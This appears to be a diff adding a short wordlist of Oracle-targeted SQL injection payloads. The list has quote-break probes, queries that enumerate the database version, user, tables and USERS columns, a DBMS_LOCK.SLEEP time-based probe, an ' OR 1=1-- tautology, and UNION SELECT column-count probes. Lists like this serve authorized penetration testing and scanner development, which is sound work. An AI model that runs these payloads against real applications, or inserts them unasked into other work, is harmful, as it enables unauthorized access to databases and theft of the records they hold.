@@ -1,0 +1,11 @@
+'
+"
+'--
+SELECT banner FROM v$version;
+SELECT user FROM dual;
+SELECT table_name FROM all_tables;
+SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
+BEGIN DBMS_LOCK.SLEEP(5); END;
+' OR 1=1--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
